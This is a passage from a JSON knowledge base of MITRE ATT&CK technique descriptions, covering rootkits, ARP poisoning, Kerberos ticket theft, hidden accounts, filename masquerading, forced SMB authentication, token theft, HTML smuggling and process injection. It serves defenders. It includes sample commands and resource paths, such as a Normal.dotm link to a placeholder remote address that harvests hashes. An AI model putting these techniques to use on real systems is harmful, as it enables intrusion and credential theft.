    "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)"
  ],
  "subvert trust controls": [
    "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) "
  ],
  "modify authentication process: network device authentication": [
    "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)"
  ],
  "adversary-in-the-middle: arp cache poisoning": [
    "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n"
  ],
  "steal or forge kerberos tickets": [
    "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n"
  ],
  "remote service session hijacking": [
    "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)"
  ],
  "plist file modification": [
    "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)"
  ],
  "hide artifacts: hidden users": [
    "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value <code>Hide500Users</code> to <code>TRUE</code> in the <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) Every user has a userID associated with it. When the <code>Hide500Users</code> key value is set to <code>TRUE</code>, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the <code>dscl</code> utility to create hidden user accounts by setting the <code>IsHidden</code> attribute to <code>1</code>. Adversaries can also hide a user\u2019s home folder by changing the <code>chflags</code> to hidden.(Citation: Apple Support Hide a User Account) \n\nAdversaries may similarly hide user accounts in Windows. Adversaries can set the <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList</code> Registry key value to <code>0</code> for a specific user to prevent that user from being listed on the logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)\n\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary."
  ],
  "data transfer size limits": [
    "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts."
  ],
  "masquerading: right-to-left override": [
    "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)\n\nAdversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default."
  ],
  "account manipulation: additional email delegate permissions": [
    "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user\u2019s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)"
  ],
  "forced authentication": [
    "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)"
  ],
  "use alternate authentication material: application access token": [
    "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nIn AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)\n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow."
  ],
  "gather victim identity information": [
    "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078))."
  ],
  "steal application access token": [
    "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.\n\nIn Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container\u2019s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)\n\nToken theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \n \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  \n\n"
  ],
  "obfuscated files or information: html smuggling": [
    "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)"
  ],
  "masquerading: double file extension": [
    "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type."
  ],
  "exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol": [
    "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. "
  ],
  "exfiltration over physical medium: exfiltration over usb": [
    "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems."
  ],
  "scheduled task/job: at": [
    "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)"
  ],
  "process injection: asynchronous procedure call": [
    "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "account discovery: cloud account": [
    "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)"
  ],
  "account manipulation: device registration": [
    "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.\n\nMFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user\u2019s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds)\n\nSimilarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)"
  ],
  "create account: cloud account": [
    "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection."
  ],
  "office application startup: add-ins": [
    "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. "
  ],
  "browser extensions": [
